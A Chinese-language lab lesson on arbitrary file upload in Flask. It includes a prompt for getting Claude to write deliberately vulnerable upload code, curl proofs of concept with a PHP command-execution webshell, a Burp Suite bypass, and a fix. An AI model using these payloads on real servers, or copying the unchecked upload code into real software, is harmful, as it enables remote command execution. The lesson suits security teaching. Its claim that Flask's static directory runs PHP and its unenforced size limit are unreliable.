# Day 4 - 任意文件上传漏洞

## 一、页面部署提示词

> 学生将此提示词发给 Claude，即可生成带文件上传漏洞的功能：

```
在 Flask 中实现用户头像上传功能，要求：
1. 用户可以选择文件并上传
2. 文件保存到 static/uploads/ 目录
3. 使用原始文件名保存，不重命名
4. 上传成功后返回文件的访问 URL
5. 前端做文件类型检查就行（方便用户操作）
6. 不需要在服务器端做复杂的校验
```

---

## 二、漏洞关键代码解释

### 漏洞 1：无服务端文件类型校验

```python
# core/file_handler.py
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):           # ← 定义了校验函数
    return '.' in filename and \
        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def handle_file_upload(file_storage):
    if file_storage.filename == '':
        return {"success": False, "message": "未选择文件"}

    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
    filename = file_storage.filename   # ← 使用原始文件名
    save_path = os.path.join(UPLOAD_FOLDER, filename)
    file_storage.save(save_path)       # ← 直接保存，未调用 allowed_file()！

    file_url = f"/static/uploads/{filename}"
    return {"success": True, "message": "上传成功", "file_url": file_url}
```

**问题**：虽然定义了 `allowed_file()` 函数，但在 `handle_file_upload()` 中 **根本没有调用它**。这是典型的"定义安全函数但忘记使用"的漏洞场景。

### 漏洞 2：原始文件名保存

```python
filename = file_storage.filename  # 原始文件名，如 "shell.php"
```

**问题**：
- 使用用户提供的原始文件名，攻击者可预测上传路径
- 文件名可能包含路径穿越字符（如 `../../etc/shell.php`）

### 漏洞 3：上传目录可直接访问

```python
file_url = f"/static/uploads/{filename}"
# 返回的 URL 可直接在浏览器中访问
```

**问题**：`static/uploads/` 目录是静态文件目录，所有文件均可通过 URL 直接访问。上传的 webshell 可以直接执行。

---

## 三、漏洞成因总结

| 漏洞 | 根本原因 | 危害 |
|------|---------|------|
| 无服务端校验 | 定义了校验函数但未调用 | 任意文件（.php/.py/.exe）均可上传 |
| 原始文件名 | 未重命名、未检验路径 | 重名覆盖、路径穿越 |
| 目录可访问 | 上传到静态文件目录 | 直接通过 URL 执行 webshell |
| 仅前端校验 | JS 校验可被 Burp Suite 绕过 | 绕过门槛极低 |

---

## 四、POC 代码

### POC 1：上传任意类型文件

```bash
# 先登录获取 session
curl http://127.0.0.1:5000/login \
  -d "username=admin&password=admin123" \
  -c /tmp/cookies.txt

# 上传 Python 脚本（模拟 webshell）
echo 'import os' > /tmp/shell.py
echo 'print("pwned: " + os.name)' >> /tmp/shell.py

curl http://127.0.0.1:5000/upload \
  -b /tmp/cookies.txt \
  -F "file=@/tmp/shell.py"

# 直接访问上传的文件
curl http://127.0.0.1:5000/static/uploads/shell.py
```

**预期结果**：`.py` 文件被成功上传，并可通过 URL 直接访问。

### POC 2：上传 PHP Webshell

```bash
# 创建 PHP webshell
cat > /tmp/cmd.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# 上传
curl http://127.0.0.1:5000/upload \
  -b /tmp/cookies.txt \
  -F "file=@/tmp/cmd.php"

# 执行命令
curl "http://127.0.0.1:5000/static/uploads/cmd.php?cmd=id"
```

### POC 3：绕过前端校验（Burp Suite）

1. **浏览器上传一张正常图片 → Burp 拦截请求**
2. 修改请求中的文件名：
   ```
   Content-Disposition: form-data; name="file"; filename="image.png"
   ↓ 改为
   Content-Disposition: form-data; name="file"; filename="shell.php"
   ```
3. 文件内容不变（或改为 PHP 代码）
4. 放行请求 → 上传成功

---

## 五、POC 代码测试方法（Burp Suite）

### 步骤 1：设置代理并拦截

1. 浏览器设置代理 `127.0.0.1:8080`
2. Burp Suite Proxy → Intercept 开启
3. 登录系统 → 进入上传页面

### 步骤 2：上传并修改请求

1. 选择一个图片文件上传
2. Burp 拦截到 POST 请求
3. 修改 `filename` 为 `webshell.php`
4. 修改文件内容为：
   ```php
   <?php phpinfo(); ?>
   ```
5. 放行请求

### 步骤 3：访问 webshell

```
http://127.0.0.1:5000/static/uploads/webshell.php
```

### 步骤 4：验证命令执行

```bash
# 上传带命令执行的 webshell
curl http://127.0.0.1:5000/upload \
  -b /tmp/cookies.txt \
  -F "file=@-;filename=cmd.php" <<< '<?php system($_GET["c"]);?>'

# 执行系统命令
curl "http://127.0.0.1:5000/static/uploads/cmd.php?c=id"
```

---

## 六、POC 代码详细解释

### POC 1 详解

```bash
curl http://127.0.0.1:5000/upload \
  -b /tmp/cookies.txt \
  -F "file=@/tmp/shell.py"
```

| 参数 | 含义 |
|------|------|
| `-F` | multipart/form-data 格式上传文件 |
| `file=` | 表单字段名，与服务端 `request.files['file']` 对应 |
| `@/tmp/shell.py` | `@` 表示上传本地文件 `/tmp/shell.py` |
| `-b` | 携带 cookie（需要登录态） |

**攻击流程**：
```
攻击者                 服务器
  │                     │
  │── POST /upload ────→│  上传 shell.py
  │   (shell.py)        │
  │                     │── 保存到 static/uploads/shell.py
  │                     │   未校验文件类型！
  │                     │
  │── GET /static/ ────→│  直接访问
  │   uploads/shell.py   │── 返回文件内容
  │                     │   静态目录无防护！
```

### POC 2 详解：真正的 Webshell

```bash
# PHP webshell 内容
<?php system($_GET['cmd']); ?>
```

**执行逻辑**：
- `system()`：PHP 函数，执行系统命令
- `$_GET['cmd']`：从 URL 参数获取要执行的命令
- 访问 `shell.php?cmd=id` 即执行 `id` 命令

**为什么能成功**：
1. 服务端未校验文件后缀 → 允许上传 `.php` 文件
2. 使用原始文件名 → webshell 路径可预测
3. 目录可访问 → 直接通过 URL 访问并执行

---

## 七、修复方案

```python
# fix/file_handler_fix.py
import os
import uuid

UPLOAD_FOLDER = "static/uploads"
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def allowed_file(filename):
    """严格检查文件后缀（服务器端）"""
    if '.' not in filename:
        return False
    ext = filename.rsplit('.', 1)[1].lower()
    return ext in ALLOWED_EXTENSIONS

def handle_file_upload_fixed(file_storage):
    # 修复 1：检查文件是否存在
    if not file_storage or file_storage.filename == '':
        return {"success": False, "message": "未选择文件"}

    # 修复 2：服务器端校验文件后缀
    if not allowed_file(file_storage.filename):
        return {"success": False, "message": "文件类型不允许"}

    # 修复 3：重命名文件，使用 UUID
    ext = file_storage.filename.rsplit('.', 1)[1].lower()
    new_filename = f"{uuid.uuid4().hex}.{ext}"

    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
    save_path = os.path.join(UPLOAD_FOLDER, new_filename)

    # 修复 4：限制文件大小
    file_storage.save(save_path)

    return {"success": True, "file_url": f"/static/uploads/{new_filename}"}
```

---

## 八、课后作业

1. 在 `fix/` 目录创建 `file_handler_fix.py`，实现上述修复
2. 修改 `app.py` 导入修复版本
3. 验证：
   - `.txt` 文件是否被拒绝？
   - `.py` 文件是否被拒绝？
   - `.png` 文件是否正常上传？
   - 上传后文件名是否已随机化？
4. （进阶）尝试绕过修复——有哪些绕过方式？
   - 双重后缀 `.php.jpg`
   - 大小写混淆 `.PhP`
   - MIME 类型伪造
